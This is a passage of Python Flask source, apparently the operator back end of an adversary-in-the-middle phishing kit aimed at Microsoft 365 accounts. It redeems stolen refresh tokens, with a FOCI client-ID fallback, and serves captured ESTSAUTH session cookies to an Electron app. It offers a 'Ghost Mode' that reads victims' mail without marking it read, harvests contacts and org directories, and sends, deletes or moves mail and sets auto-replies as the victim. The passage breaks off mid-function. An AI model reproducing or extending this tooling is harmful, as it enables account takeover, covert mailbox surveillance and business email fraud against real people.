        "admin.microsoft": "https://graph.microsoft.com/.default openid profile offline_access",
        "portal.azure": "https://management.azure.com/.default openid profile offline_access",
        "office.com": "https://outlook.office365.com/.default openid profile offline_access",
    }
    scope = "https://graph.microsoft.com/.default openid profile offline_access"  # default
    for key, s in scope_map.items():
        if key in redirect_uri.lower():
            scope = s
            break

    log.info(f"🔑 OAuth-complete for {upn}: client={exchange_client_id[:8]}..., scope={scope.split()[0]}, response_type={response_type}")

    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    r = requests.post(
        "https://login.microsoftonline.com/common/oauth2/v2.0/token",
        data={
            "client_id": exchange_client_id,
            "grant_type": "refresh_token",
            "refresh_token": rt,
            "scope": scope,
        },
        headers=ua, timeout=15,
    )

    if r.status_code != 200:
        log.warning(f"OAuth-complete failed: {r.text[:200]}")
        # If the requested client_id fails, retry with the FOCI fallback
        if exchange_client_id != "d3590ed6-52b3-4102-aeff-aad2292ab01c":
            log.info(f"🔄 Retrying with FOCI fallback client_id")
            r = requests.post(
                "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                data={
                    "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                    "grant_type": "refresh_token",
                    "refresh_token": rt,
                    "scope": scope,
                },
                headers=ua, timeout=15,
            )
            if r.status_code != 200:
                log.warning(f"OAuth-complete FOCI fallback also failed: {r.text[:200]}")
                return f"Token exchange failed: {r.text[:200]}", 400
        else:
            return f"Token exchange failed: {r.text[:200]}", 400

    resp = r.json()
    access_token = resp.get("access_token", "")
    id_token = resp.get("id_token", "")
    actual_scope = resp.get("scope", scope.split(" openid")[0])

    log.info(f"🔑 OAuth-complete for {upn}: generating redirect to {redirect_uri[:60]}")

    # Implicit flow: tokens go in the URL fragment hash
    # (PKCE flows are handled client-side in Electron with interaction_required error)
    import urllib.parse
    fragment_params = {
        "access_token": access_token,
        "token_type": "Bearer",
        "expires_in": str(resp.get("expires_in", 3599)),
        "scope": actual_scope if actual_scope else scope.split(" openid")[0],
        "id_token": id_token,
        "state": state,
    }

    fragment = urllib.parse.urlencode(fragment_params)
    final_url = f"{redirect_uri}#{fragment}"

    return redirect(final_url, code=302)


# ─── Browser Cookies API (for Electron App) ──────────────────────────

@app.route("/admin/api/tokens/check-health")
def api_token_check_health():
    """Test which refresh tokens are still valid without modifying them."""
    tokens = _safe_load_tokens()
    results = []
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    for i, t in enumerate(tokens):
        rt = t.get("refresh_token", "")
        if not rt:
            results.append({"idx": i, "status": "no_token", "label": "No Token"})
            continue
        
        try:
            r = requests.post(
                "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                data={
                    "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                    "grant_type": "refresh_token",
                    "refresh_token": rt,
                    "scope": "https://graph.microsoft.com/.default offline_access",
                },
                headers=ua, timeout=10,
            )
            if r.status_code == 200:
                resp = r.json()
                # Update the stored refresh token if a new one was issued
                new_rt = resp.get("refresh_token", "")
                if new_rt and new_rt != rt:
                    tokens[i]["refresh_token"] = new_rt
                tokens[i]["last_refreshed"] = now_utc().isoformat()
                results.append({"idx": i, "status": "alive", "label": "Alive"})
            else:
                err = r.json().get("error", "unknown")
                desc = r.json().get("error_description", "")[:80]
                if "revoked" in desc.lower() or "expired" in desc.lower():
                    results.append({"idx": i, "status": "revoked", "label": "Revoked"})
                elif "invalid_grant" in err:
                    results.append({"idx": i, "status": "expired", "label": "Expired"})
                else:
                    results.append({"idx": i, "status": "error", "label": f"Error: {err}"})
        except Exception as e:
            results.append({"idx": i, "status": "error", "label": f"Network error"})
    
    # Save updated tokens (refresh tokens may have been rotated)
    _safe_save_tokens(tokens)
    
    alive = sum(1 for r in results if r["status"] == "alive")
    return jsonify({"results": results, "alive": alive, "total": len(tokens)})

@app.route("/admin/api/browser-cookies")
def api_browser_cookies():
    """Return captured ESTSAUTH cookies for a token index."""
    idx = int(request.args.get("idx", 0))
    
    try:
        with open(TOKEN_LOG, "r") as f:
            tokens = json.load(f)
    except:
        return jsonify({"error": "no tokens file"}), 404

    if idx < 0 or idx >= len(tokens):
        return jsonify({"error": "invalid index"}), 404

    token_data = tokens[idx]

    # Operator access check
    current = _get_current_operator()
    if current["role"] != "admin" and token_data.get("operator_id", "admin") != current["operator_id"]:
        return jsonify({"error": "access denied"}), 403
    browser_cookies = token_data.get("browser_cookies", {})
    
    if not browser_cookies.get("ESTSAUTH"):
        return jsonify({"error": "no browser cookies captured for this user", "hint": "User needs to authenticate via AiTM proxy"}), 404

    return jsonify({
        "upn": token_data.get("upn", "unknown"),
        "cookies": [
            {
                "name": "ESTSAUTH",
                "value": browser_cookies["ESTSAUTH"],
                "domain": ".login.microsoftonline.com",
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "no_restriction",
            },
            {
                "name": "ESTSAUTHPERSISTENT",
                "value": browser_cookies.get("ESTSAUTHPERSISTENT", browser_cookies["ESTSAUTH"]),
                "domain": ".login.microsoftonline.com",
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "no_restriction",
            },
        ],
        "captured_at": browser_cookies.get("captured_at", ""),
    })

@app.route("/admin/api/folder-std/<path:folder_name>")
def api_std_folder(folder_name):
    """List messages from a standard folder with pagination."""
    idx = int(request.args.get("idx", 0))
    top = min(int(request.args.get("top", 250)), 250)
    skip = int(request.args.get("skip", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        url = (
            f"https://graph.microsoft.com/v1.0/me/mailFolders/{folder_name}/messages"
            f"?$top={top}&$skip={skip}"
            f"&$select=id,subject,from,bodyPreview,receivedDateTime,isRead,hasAttachments"
            f"&$orderby=receivedDateTime desc"
        )
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            messages = []
            for msg in data.get("value", []):
                from_info = msg.get("from", {}).get("emailAddress", {}) if msg.get("from") else {}
                messages.append({
                    "id": msg["id"],
                    "subject": msg.get("subject", ""),
                    "from": from_info.get("name", from_info.get("address", "Unknown")),
                    "fromAddress": from_info.get("address", ""),
                    "preview": msg.get("bodyPreview", "")[:120],
                    "date": msg.get("receivedDateTime", ""),
                    "isRead": msg.get("isRead", True),
                    "hasAttachments": msg.get("hasAttachments", False),
                })
            next_link = None
            if len(messages) == top:
                next_link = f"/admin/api/folder-std/{folder_name}?idx={idx}&top={top}&skip={skip + top}"
            return jsonify({
                "messages": messages,
                "nextLink": next_link,
                "count": len(messages),
            })
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/search")
def api_search_emails():
    """Search emails across all folders."""
    idx = int(request.args.get("idx", 0))
    q = request.args.get("q", "")
    if not q:
        return jsonify({"error": "no query"}), 400
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/messages?$search=\"{q}\"&$top=100&$select=id,subject,from,bodyPreview,receivedDateTime",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            messages = []
            for msg in r.json().get("value", []):
                from_info = msg.get("from", {}).get("emailAddress", {}) if msg.get("from") else {}
                messages.append({
                    "id": msg["id"],
                    "subject": msg.get("subject", ""),
                    "from": from_info.get("name", from_info.get("address", "Unknown")),
                    "preview": msg.get("bodyPreview", "")[:100],
                    "date": msg.get("receivedDateTime", ""),
                })
            return jsonify({"messages": messages})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─── Mailbox V2: Ghost Mode, Polling, Folders, Extract ───────────────

@app.route("/admin/api/ghost", methods=["GET", "PATCH"])
def api_ghost_mode():
    """Get or toggle Ghost Mode (emails stay unread when viewed)."""
    global GHOST_MODE
    if request.method == "PATCH":
        data = request.get_json(silent=True) or {}
        GHOST_MODE = bool(data.get("ghost_mode", not GHOST_MODE))
        log.info(f"👻 Ghost Mode {'ON' if GHOST_MODE else 'OFF'}")
        return jsonify({"ghost_mode": GHOST_MODE})
    return jsonify({"ghost_mode": GHOST_MODE})


@app.route("/admin/api/message/<path:msg_id>/read", methods=["PATCH"])
def api_mark_read(msg_id):
    """Mark a message as read or unread via Graph API."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json(silent=True) or {}
    is_read = data.get("isRead", True)
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    try:
        r = requests.patch(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
            headers=headers, json={"isRead": is_read}, timeout=10,
        )
        if r.status_code == 200:
            return jsonify({"status": "updated", "isRead": is_read})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/messages/mark-all-read", methods=["POST"])
def api_mark_all_read():
    """Mark all unread messages in inbox as read (batch)."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        # Fetch unread message IDs
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages"
            "?$filter=isRead eq false&$top=500&$select=id",
            headers=headers, timeout=15,
        )
        if r.status_code != 200:
            return jsonify({"error": "failed to fetch unread"}), 500
        unread_ids = [m["id"] for m in r.json().get("value", [])]
        if not unread_ids:
            return jsonify({"status": "done", "marked": 0})
        # Batch mark as read (20 at a time via $batch)
        patch_headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
        marked = 0
        for msg_id in unread_ids:
            requests.patch(
                f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                headers=patch_headers, json={"isRead": True}, timeout=5,
            )
            marked += 1
        log.info(f"📖 Marked {marked} messages as read")
        return jsonify({"status": "done", "marked": marked})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/mail/check-new")
def api_check_new_mail():
    """Lightweight poll: check if new mail has arrived since last check."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages"
            "?$top=1&$select=id,receivedDateTime&$orderby=receivedDateTime desc",
            headers=headers, timeout=8,
        )
        if r.status_code != 200:
            return jsonify({"new_count": 0}), 200
        msgs = r.json().get("value", [])
        latest_id = msgs[0]["id"] if msgs else None

        # Get unread count
        rc = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox?$select=unreadItemCount,totalItemCount",
            headers=headers, timeout=8,
        )
        folder_info = rc.json() if rc.status_code == 200 else {}
        unread = folder_info.get("unreadItemCount", 0)
        total = folder_info.get("totalItemCount", 0)

        # Compare with last known
        state = mail_poll_state.get(idx, {})
        last_id = state.get("last_id")
        is_new = latest_id and latest_id != last_id and last_id is not None
        mail_poll_state[idx] = {"last_id": latest_id, "last_check": time.time()}

        return jsonify({
            "new_mail": is_new,
            "latest_id": latest_id,
            "unread_count": unread,
            "total_count": total,
        })
    except Exception as e:
        return jsonify({"error": str(e), "new_mail": False}), 200


@app.route("/admin/api/mail/folders")
def api_mail_folders():
    """Fetch the full folder tree with unread counts and child folders."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}

    def fetch_children(parent_id):
        """Recursively fetch child folders."""
        try:
            cr = requests.get(
                f"https://graph.microsoft.com/v1.0/me/mailFolders/{parent_id}/childFolders"
                "?$top=50&$select=id,displayName,unreadItemCount,totalItemCount,childFolderCount",
                headers=headers, timeout=10,
            )
            if cr.status_code != 200:
                return []
            children = []
            for cf in cr.json().get("value", []):
                child = {
                    "id": cf["id"],
                    "name": cf.get("displayName", ""),
                    "unread": cf.get("unreadItemCount", 0),
                    "total": cf.get("totalItemCount", 0),
                    "children": [],
                }
                if cf.get("childFolderCount", 0) > 0:
                    child["children"] = fetch_children(cf["id"])
                children.append(child)
            return children
        except Exception:
            return []

    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders"
            "?$top=50&$select=id,displayName,unreadItemCount,totalItemCount,parentFolderId,childFolderCount",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            folders = []
            for f in r.json().get("value", []):
                folder = {
                    "id": f["id"],
                    "name": f.get("displayName", ""),
                    "unread": f.get("unreadItemCount", 0),
                    "total": f.get("totalItemCount", 0),
                    "parentId": f.get("parentFolderId", ""),
                    "children": [],
                }
                if f.get("childFolderCount", 0) > 0:
                    folder["children"] = fetch_children(f["id"])
                folders.append(folder)
            return jsonify({"folders": folders})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/calendar")
def api_calendar_events():
    """Fetch upcoming calendar events for the next 7 days."""
    idx = int(request.args.get("idx", 0))
    days = int(request.args.get("days", 7))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}", "Prefer": 'outlook.timezone="UTC"'}
    from datetime import timedelta
    start = now_utc().strftime("%Y-%m-%dT%H:%M:%S")
    end = (now_utc() + timedelta(days=days)).strftime("%Y-%m-%dT%H:%M:%S")
    try:
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/calendarView"
            f"?startDateTime={start}&endDateTime={end}"
            f"&$top=50&$select=id,subject,start,end,organizer,location,isAllDay,bodyPreview,webLink"
            f"&$orderby=start/dateTime",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            events = []
            for ev in r.json().get("value", []):
                events.append({
                    "id": ev.get("id", ""),
                    "subject": ev.get("subject", "(No subject)"),
                    "start": ev.get("start", {}).get("dateTime", ""),
                    "end": ev.get("end", {}).get("dateTime", ""),
                    "organizer": ev.get("organizer", {}).get("emailAddress", {}).get("name", ""),
                    "organizer_email": ev.get("organizer", {}).get("emailAddress", {}).get("address", ""),
                    "location": ev.get("location", {}).get("displayName", ""),
                    "isAllDay": ev.get("isAllDay", False),
                    "preview": ev.get("bodyPreview", ""),
                    "webLink": ev.get("webLink", ""),
                })
            return jsonify({"events": events, "count": len(events)})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/message/<path:msg_id>/flag", methods=["PATCH"])
def api_flag_message(msg_id):
    """Toggle flag status on a message."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    flagged = data.get("flagged", True)
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    body = {"flag": {"flagStatus": "flagged" if flagged else "notFlagged"}}
    try:
        r = requests.patch(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
            headers=headers, json=body, timeout=10,
        )
        if r.status_code == 200:
            return jsonify({"status": "updated", "flagged": flagged})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/send-with-attachment", methods=["POST"])
def api_send_with_attachment():
    """Send an email with file attachments."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401

    to_email = request.form.get("to", "")
    cc = request.form.get("cc", "")
    subject = request.form.get("subject", "")
    body_text = request.form.get("body", "")
    if not to_email:
        return jsonify({"error": "recipient required"}), 400

    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    to_list = [{"emailAddress": {"address": e.strip()}} for e in to_email.split(",") if e.strip()]
    cc_list = [{"emailAddress": {"address": e.strip()}} for e in cc.split(",") if e.strip()] if cc else []

    msg_body = {
        "message": {
            "subject": subject,
            "body": {"contentType": "HTML", "content": body_text.replace("\n", "<br>")},
            "toRecipients": to_list,
            "ccRecipients": cc_list,
            "attachments": [],
        }
    }

    # Process file attachments
    import base64
    for f in request.files.getlist("attachments"):
        if f and f.filename:
            content = base64.b64encode(f.read()).decode()
            msg_body["message"]["attachments"].append({
                "@odata.type": "#microsoft.graph.fileAttachment",
                "name": f.filename,
                "contentType": f.content_type or "application/octet-stream",
                "contentBytes": content,
            })

    try:
        r = requests.post(
            "https://graph.microsoft.com/v1.0/me/sendMail",
            headers=headers, json=msg_body, timeout=30,
        )
        if r.status_code == 202:
            log.info(f"📧 Sent email with {len(msg_body['message']['attachments'])} attachments to {to_email}")
            return jsonify({"status": "sent"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500




@app.route("/admin/api/extract-emails")
def api_extract_emails():
    """Extract unique email addresses from all 4 sources: inbox+sent, People API, Contacts, org directory."""
    idx = int(request.args.get("idx", 0))
    include_org = request.args.get("org", "false").lower() == "true"
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}

    # {address.lower(): {"address": ..., "name": ...}}
    seen = {}

    def _add(address, name=""):
        if not address or "@" not in address:
            return
        key = address.lower().strip()
        if key not in seen:
            seen[key] = {"address": key, "name": name or ""}

    def _harvest_messages(folder_url):
        """Paginate through a mail folder collecting addresses."""
        url = (
            f"{folder_url}?$select=from,toRecipients,ccRecipients,bccRecipients"
            "&$top=100&$orderby=receivedDateTime desc"
        )
        pages = 0
        while url and pages < 20:
            try:
                r = requests.get(url, headers=headers, timeout=20)
                if r.status_code != 200:
                    break
                data = r.json()
                for msg in data.get("value", []):
                    fr = msg.get("from", {}).get("emailAddress", {})
                    _add(fr.get("address", ""), fr.get("name", ""))
                    for field in ("toRecipients", "ccRecipients", "bccRecipients"):
                        for recip in msg.get(field, []):
                            ea = recip.get("emailAddress", {})
                            _add(ea.get("address", ""), ea.get("name", ""))
                url = data.get("@odata.nextLink")
                pages += 1
            except Exception:
                break

    try:
        # Source 1: Inbox
        _harvest_messages("https://graph.microsoft.com/v1.0/me/mailFolders/Inbox/messages")

        # Source 2: Sent Items
        _harvest_messages("https://graph.microsoft.com/v1.0/me/mailFolders/SentItems/messages")

        # Source 3: People API (interaction-ranked contacts)
        try:
            r = requests.get(
                "https://graph.microsoft.com/v1.0/me/people?$top=100&$select=displayName,scoredEmailAddresses",
                headers=headers, timeout=15,
            )
            if r.status_code == 200:
                for person in r.json().get("value", []):
                    name = person.get("displayName", "")
                    for ea in person.get("scoredEmailAddresses", []):
                        _add(ea.get("address", ""), name)
        except Exception:
            pass

        # Source 4: Contacts object
        try:
            r = requests.get(
                "https://graph.microsoft.com/v1.0/me/contacts?$top=200&$select=displayName,emailAddresses",
                headers=headers, timeout=15,
            )
            if r.status_code == 200:
                for contact in r.json().get("value", []):
                    name = contact.get("displayName", "")
                    for ea in contact.get("emailAddresses", []):
                        _add(ea.get("address", ""), name)
        except Exception:
            pass

        # Source 5 (optional): Org directory — only when ?org=true
        if include_org:
            url = "https://graph.microsoft.com/v1.0/users?$select=displayName,mail,userPrincipalName&$top=100"
            pages = 0
            while url and pages < 50:
                try:
                    r = requests.get(url, headers=headers, timeout=20)
                    if r.status_code != 200:
                        break
                    data = r.json()
                    for user in data.get("value", []):
                        addr = user.get("mail") or user.get("userPrincipalName", "")
                        _add(addr, user.get("displayName", ""))
                    url = data.get("@odata.nextLink")
                    pages += 1
                except Exception:
                    break

        result = sorted(seen.values(), key=lambda x: x["address"])
        log.info(f"📧 Extracted {len(result)} unique contacts (org={include_org})")
        return jsonify({"contacts": result, "count": len(result)})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/contacts")
def api_list_contacts():
    """List user contacts."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/contacts?$top=100&$select=displayName,emailAddresses,mobilePhone,businessPhones,companyName,jobTitle",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            contacts = []
            for c in r.json().get("value", []):
                emails = c.get("emailAddresses", [])
                email = emails[0].get("address", "") if emails else ""
                phones = c.get("businessPhones", [])
                phone = phones[0] if phones else c.get("mobilePhone", "")
                contacts.append({
                    "name": c.get("displayName", ""),
                    "email": email,
                    "phone": phone or "",
                    "company": c.get("companyName", ""),
                    "title": c.get("jobTitle", ""),
                })
            return jsonify({"contacts": contacts})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/autoreply")
def api_get_autoreply():
    """Get current auto-reply / out-of-office settings."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailboxSettings/automaticRepliesSetting",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            data = r.json()
            return jsonify({
                "status": data.get("status", "disabled"),
                "internalMessage": data.get("internalReplyMessage", ""),
                "externalMessage": data.get("externalReplyMessage", ""),
                "externalAudience": data.get("externalAudience", "none"),
                "startTime": data.get("scheduledStartDateTime", {}).get("dateTime", ""),
                "endTime": data.get("scheduledEndDateTime", {}).get("dateTime", ""),
            })
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/autoreply", methods=["PATCH"])
def api_set_autoreply():
    """Set auto-reply / out-of-office settings."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    settings = {
        "automaticRepliesSetting": {
            "status": data.get("status", "disabled"),
            "internalReplyMessage": data.get("internalMessage", ""),
            "externalReplyMessage": data.get("externalMessage", ""),
            "externalAudience": "all" if data.get("externalEnabled") else "none",
        }
    }
    try:
        r = requests.patch(
            "https://graph.microsoft.com/v1.0/me/mailboxSettings",
            headers=headers, json=settings, timeout=15,
        )
        if r.status_code == 200:
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"🔄 Auto-reply updated for {upn}: {data.get('status')}")
            return jsonify({"status": "updated"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/message/<path:msg_id>", methods=["DELETE"])
def api_delete_message(msg_id):
    """Delete a message."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.delete(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
            headers=headers, timeout=10,
        )
        if r.status_code == 204:
            return jsonify({"status": "deleted"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/move", methods=["POST"])
def api_move_message():
    """Move a message to a different folder."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    msg_id = data.get("msg_id", "")
    folder_id = data.get("folder_id", "")
    if not msg_id or not folder_id:
        return jsonify({"error": "msg_id and folder_id required"}), 400
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/move",
            headers=headers, json={"destinationId": folder_id}, timeout=15,
        )
        if r.status_code in (200, 201):
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"📂 Message moved for {upn}: {msg_id[:20]}...")
            return jsonify({"status": "moved"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/folder-messages/<path:folder_name>")
def api_folder_messages(folder_name):
    """List messages from a named folder (RSS Feeds, Conversation History, etc)."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        fr = requests.get(
            f"https://graph.microsoft.com/v1.0/me/mailFolders?$filter=displayName eq '{folder_name}'",
            headers=headers, timeout=10,
        )
        if fr.status_code != 200:
            return jsonify({"error": f"Could not find folder: {folder_name}"}), 404
        folders = fr.json().get("value", [])
        if not folders:
            pfr = requests.get(
                "https://graph.microsoft.com/v1.0/me/mailFolders?$top=50",
                headers=headers, timeout=10,
            )
            if pfr.status_code == 200:
                for pf in pfr.json().get("value", []):
                    cfr = requests.get(
                        f"https://graph.microsoft.com/v1.0/me/mailFolders/{pf['id']}/childFolders?$filter=displayName eq '{folder_name}'",
                        headers=headers, timeout=10,
                    )
                    if cfr.status_code == 200:
                        child_folders = cfr.json().get("value", [])
                        if child_folders:
                            folders = child_folders
                            break
            if not folders:
                return jsonify({"error": f"Folder '{folder_name}' not found", "messages": []})
        folder_id = folders[0]["id"]
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/mailFolders/{folder_id}/messages?$top=100&$select=id,subject,from,bodyPreview,receivedDateTime&$orderby=receivedDateTime desc",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            messages = []
            for msg in r.json().get("value", []):
                from_info = msg.get("from", {}).get("emailAddress", {})
                messages.append({
                    "id": msg["id"],
                    "subject": msg.get("subject", ""),
                    "from": from_info.get("name", from_info.get("address", "Unknown")),
                    "preview": msg.get("bodyPreview", "")[:100],
                    "date": msg.get("receivedDateTime", ""),
                })
            return jsonify({"messages": messages})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/sent")
def api_sent_messages():
    """List sent messages with pagination."""
    idx = int(request.args.get("idx", 0))
    top = min(int(request.args.get("top", 250)), 250)
    skip = int(request.args.get("skip", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/mailFolders/sentItems/messages?$top={top}&$skip={skip}&$select=id,subject,toRecipients,bodyPreview,sentDateTime&$orderby=sentDateTime desc",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            messages = []
            for msg in r.json().get("value", []):
                to_list = [r.get("emailAddress", {}).get("address", "")
                           for r in msg.get("toRecipients", [])]
                messages.append({
                    "id": msg["id"],
                    "subject": msg.get("subject", ""),
                    "to": ", ".join(to_list) if to_list else "Unknown",
                    "preview": msg.get("bodyPreview", "")[:100],
                    "date": msg.get("sentDateTime", ""),
                })
            next_link = f"/admin/api/sent?idx={idx}&top={top}&skip={skip + top}" if len(messages) == top else None
            return jsonify({"messages": messages, "nextLink": next_link})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/drafts")
def api_list_drafts():
    """List draft messages with pagination."""
    idx = int(request.args.get("idx", 0))
    top = min(int(request.args.get("top", 250)), 250)
    skip = int(request.args.get("skip", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/mailFolders/drafts/messages?$top={top}&$skip={skip}&$select=id,subject,toRecipients,bodyPreview,lastModifiedDateTime&$orderby=lastModifiedDateTime desc",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            messages = []
            for msg in r.json().get("value", []):
                to_list = [r.get("emailAddress", {}).get("address", "")
                           for r in msg.get("toRecipients", [])]
                messages.append({
                    "id": msg["id"],
                    "subject": msg.get("subject", ""),
                    "to": ", ".join(to_list) if to_list else "No recipient",
                    "preview": msg.get("bodyPreview", "")[:100],
                    "date": msg.get("lastModifiedDateTime", ""),
                })
            next_link = f"/admin/api/drafts?idx={idx}&top={top}&skip={skip + top}" if len(messages) == top else None
            return jsonify({"messages": messages, "nextLink": next_link})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/drafts", methods=["POST"])
def api_create_draft():
    """Create a draft message, optionally send it immediately."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    draft = {
        "subject": data.get("subject", ""),
        "body": {"contentType": "HTML", "content": data.get("body", "")},
    }
    if data.get("to"):
        draft["toRecipients"] = [{"emailAddress": {"address": a.strip()}}
                                  for a in data["to"].split(",") if a.strip()]
    try:
        # Create the draft
        r = requests.post(
            "https://graph.microsoft.com/v1.0/me/messages",
            headers=headers, json=draft, timeout=15,
        )
        if r.status_code in (200, 201):
            created = r.json()
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"📝 Draft created for {upn}: {data.get('subject', '')}")
            # If send=True, send it immediately
            if data.get("send"):
                draft_id = created["id"]
                sr = requests.post(
                    f"https://graph.microsoft.com/v1.0/me/messages/{draft_id}/send",
                    headers=headers, timeout=15,
                )
                if sr.status_code == 202:
                    log.info(f"📤 Draft sent for {upn}")
                    return jsonify({"status": "sent"})
